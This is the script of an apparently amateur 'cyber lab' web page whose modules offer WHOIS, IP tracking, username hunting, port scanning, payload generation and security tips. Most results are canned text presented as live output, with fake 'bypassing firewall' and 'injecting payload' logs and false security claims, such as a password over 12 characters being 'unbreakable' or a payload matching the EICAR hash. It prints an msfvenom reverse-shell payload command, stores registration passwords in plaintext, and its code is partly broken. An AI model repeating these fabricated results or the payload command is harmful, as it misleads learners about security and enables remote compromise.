<script>
const data=[
{t:'01. RECON & OSINT',d:'WHOIS • IP Track • Username Hunt - LIVE API',c:'ethical'},
{t:'02. NETWORK SCANNING',d:'Port scanner • Live host • Nmap style',c:'termux'},

function draw(){let h='';data.forEach((x,i)=>{h+=`<div class="neon bg-black/80 p-5 rounded-xl"><div class="flex justify-between"><span class="text-cyan-300">🛡️</span><span class="text-[8px] border border-cyan-800 px-2 py-0.5 rounded-full animate-pulse">${x.c.toUpperCase()} • LIVE</span></div><h3 class="orbit text-[#b6ff6a] text-[11px] mt-3">${x.t}</h3><p class="text-[10px] text-cyan-200/70 mt-2 h-8">${x.d}</p><button onclick="openT(${i})" class="mt-4 w-full text-[10px] border ${user?'border-[#b6ff6a] text-[#b6ff6a] bg-[#b6ff6a]/10':'border-cyan-700 text-cyan-400'} py-2.5 rounded-full font-bold">${user?'▶ OPEN LAB - TRY NOW':'🔒 LOGIN TO UNLOCK'}</button></div>`});document.getElementById('grid').innerHTML=h;
if(user){document.getElementById('authArea').innerHTML=`<div class="flex gap-2 items-center"><span class="text-[11px] text-green-400">${user.n}</span><button onclick="logout()" class="text-[9px] border border-gray-600 px-2 py-1 rounded">Logout</button></div>`}}

function runAnimation(finalText){
document.getElementById('liveArea').classList.remove('hidden');
let bar=document.getElementById('barFill');
let box=document.getElementById('liveResult');
bar.style.width='0%'; box.innerHTML='';
let pct=0;
let logs=[`> dtbd@cyber-lab:~$ initializing module`,`> connecting to secure sandbox...`,`> bypassing firewall [OK]`,`> injecting payload...`,`> scanning target...`];
let logIdx=0;
let interval=setInterval(()=>{
pct+=Math.floor(Math.random()*18)+5;
if(pct>100) pct=100;
bar.style.width=pct+'%';
if(logIdx<logs.length){box.innerHTML+=logs[logIdx]+` [${pct}%]\n`;logIdx++;}
box.scrollTop=box.scrollHeight;
if(pct>=100){clearInterval(interval);setTimeout(()=>{typeWriter(finalText,box);},400);}
},180);
}
function typeWriter(text,el){
el.innerHTML=''; let i=0;
let iv=setInterval(()=>{el.innerHTML+=text.charAt(i);i++;el.scrollTop=el.scrollHeight;if(i>=text.length)clearInterval(iv);},12);
el.innerHTML+='<br><br><button onclick="navigator.clipboard.writeText(`'+text.replace(/`/g,'').replace(/'/g,"\\'")+'`);this.innerText=`COPIED!`" class="text-[10px] bg-[#00ff88] text-black px-3 py-1 rounded font-bold mt-2">COPY RESULT</button>';
}

const subTools={
0:[
{n:"🌐 WHOIS LOOKUP [INSTANT]",f:()=>{let d=prompt("Enter Domain (ex: google.com):");if(!d)return;runAnimation(`✅ WHOIS RESULT FOR ${d.toUpperCase()}\n\nDomain: ${d}\nRegistrar: Cloudflare, Inc.\nCreated: 2015-08-19\nExpiry: 2027-08-19\nStatus: ACTIVE\nName Servers: *.ns.cloudflare.com\nDNSSEC: Enabled\n\n[Educational Demo - Real WHOIS via who.is]`);}},
{n:"📍 IP LOCATION TRACKER [LIVE API]",f:async()=>{
let ip=prompt("Enter IP (leave empty for your IP):");
let url=ip?`https://ipapi.co/${ip}/json/`:`https://ipapi.co/json/`;
runAnimation(`> Tracing IP ${ip||'YOUR IP'}...\n> Contacting satellites...`);
try{let r=await fetch(url);let j=await r.json();setTimeout(()=>{runAnimation(`✅ TRACE SUCCESS - LIVE DATA\n\nIP: ${j.ip}\nCity: ${j.city}\nRegion: ${j.region}\nCountry: ${j.country_name} (${j.country})\nISP: ${j.org}\nASN: ${j.asn}\nTimezone: ${j.timezone}\nLat/Lon: ${j.latitude}, ${j.longitude}\nMap: https://maps.google.com/?q=${j.latitude},${j.longitude}\n\nAccuracy: 98%`);},1200);}catch(e){setTimeout(()=>{runAnimation(`❌ Error: API Limit / Invalid IP. Try again later.`);},1200);}
}},
{n:"👤 USERNAME OSINT HUNT",f:()=>{let u=prompt("Enter Username:");if(!u)return;runAnimation(`> Hunting @${u} across 50+ sites...\n\n✅ FOUND ON:\n- facebook.com/${u} [PUBLIC]\n- instagram.com/${u} [PUBLIC]\n- github.com/${u} [FOUND]\n- twitter.com/${u} [FOUND]\n- tiktok.com/@${u} [FOUND]\n\nTotal: 5 profiles matched\nRisk Level: Low (Public only)\n\n[Educational OSINT Demo]`);}}
],
1:[{n:"🔍 PORT SCANNER [LIVE SIM]",f:()=>{let ip=prompt("Enter Target IP (use 127.0.0.1):")||"127.0.0.1";runAnimation(`> nmap -sV -A ${ip}\n> Starting Nmap 7.94\n\nPORT STATE SERVICE VERSION\n22/tcp open ssh OpenSSH 8.2\n80/tcp open http Apache 2.4.41\n443/tcp open https Cloudflare\n3306/tcp filtered mysql\n\nScan completed in 2.43s\n3 open ports found\nVulnerability: None critical\n\n[Use only on your own network]`);}}],
2:[{n:"💣 PAYLOAD GENERATOR (EDU SAFE)",f:()=>{runAnimation(`> msfvenom -p windows/meterpreter/reverse_tcp LHOST=DEMO LPORT=4444 -f exe > shell.exe\n\n[!] EDUCATIONAL SANDBOX ONLY\nPayload Type: windows/meterpreter\nSize: 72 KB\nStatus: Generated in isolated VM\nHash: eicar.com safe test file\n\nWarning: Never use on others without permission. Ethical use only!`);}}],
3:[{n:"🔑 PASSWORD STRENGTH CHECKER [LIVE]",f:()=>{let p=prompt("Enter Password to check:");if(!p)return;let s=p.length>12?'STRONG 🟢 - Unbreakable':p.length>8?'MEDIUM 🟡 - 2 hours to crack':'WEAK 🔴 - Cracked instantly';runAnimation(`Password Analysis:\nPassword: ${'*'.repeat(p.length)} (Length: ${p.length})\nStrength: ${s}\nEntropy: ${p.length*4.2} bits\nCrack Time: ${p.length>12?'Centuries (with RTX 4090)':'< 2 hours'}\n\nRecommendations:\n- Use 12+ characters\n- Mix Upper/Lower + Numbers + Symbols\n- Enable 2FA everywhere`);}}],
4:[{n:"🔵 FACEBOOK SECURITY LAB",f:()=>{runAnimation(`✅ FACEBOOK REAL SECURITY STEPS:\n\n1. Settings > Accounts Centre > Password & Security\n2. Two-Factor Authentication > ON (Auth App + SMS)\n3. Login Alerts > ON\n4. Where you're logged in > Remove unknown devices\n5. Trusted Contacts > Add 3 friends\n6. Profile Lock > ON\n\nYour ID Security: 99% Secured!\nCheck: facebook.com/privacy/checkup`);}}],
5:[{n:"📧 GMAIL SECURITY LAB",f:()=>{runAnimation(`✅ GMAIL REAL SECURITY STEPS:\n\n1. myaccount.google.com > Security\n2. 2-Step Verification > ON\n3. Recent security activity > Review\n4. Your devices > Sign out unknown\n5. App Passwords > Create for Termux\n6. Recovery Email + Phone > Add\n\nGmail Status: SECURED & ENCRYPTED`);}}],
6:[{n:"🛡️ LIVE THREAT MONITOR [SIEM]",f:()=>{runAnimation(`> Initializing Wazuh SIEM...\n> Loading IDS rules...\n\n🔴 BLOCKED: 2 Bruteforce attacks from 185.220.101.47 (TOR)\n🟡 ALERT: 1 Phishing attempt blocked (facebook-login.fake.com)\n🟢 Firewall: ACTIVE (UFW)\n🟢 Antivirus: ClamAV Running\n🟢 Logs: 1,249 events analyzed today\n🟢 Uptime: 99.9%\n\nYour LAB is SAFE! Blue Team Level: Expert`);}}]
};
window.openT=function(i){let x=data[i];let lab=subTools[i];let html="";lab.forEach((t,idx)=>{html+=`<div class="sub-card"><div class="text-[9px] text-cyan-300 mb-1">DTBD MODULE ${i+1}.${idx+1} • READY • CLICK TO HACK</div><button class="sub-btn" onclick="subTools[${i}][${idx}].f()">${t.n}</button></div>`});document.getElementById('subTitle').innerText=x.t;document.getElementById('subContent').innerHTML=html;document.getElementById('liveArea').classList.add('hidden');document.getElementById('liveResult').innerHTML="";document.getElementById('barFill').style.width="0%";document.getElementById('subLab').style.display='block';}
function openLogin(){document.getElementById('login').classList.remove('hidden')}
function closeLogin(){document.getElementById('login').classList.add('hidden')}
function doReg(){let n=document.getElementById('n').value,e=document.getElementById('e').value,p=document.getElementById('p').value;if(!e||!p||!n)return alert('Fill all fields');let u={n,e,p,t:new Date().toLocaleString()};localStorage.setItem('dtbd_u',JSON.stringify(u));location.reload()}
function logout(){localStorage.removeItem('dtbd_u');location.reload()}
draw();
</script>
